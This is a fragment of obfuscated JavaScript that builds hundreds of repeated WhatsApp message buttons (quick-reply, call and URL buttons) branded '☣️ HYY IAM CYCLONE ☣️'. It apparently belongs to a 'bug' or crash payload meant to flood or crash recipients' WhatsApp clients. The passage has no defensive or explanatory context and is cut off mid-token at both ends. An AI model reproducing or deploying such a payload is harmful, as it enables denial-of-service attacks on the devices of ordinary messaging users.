xt':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'c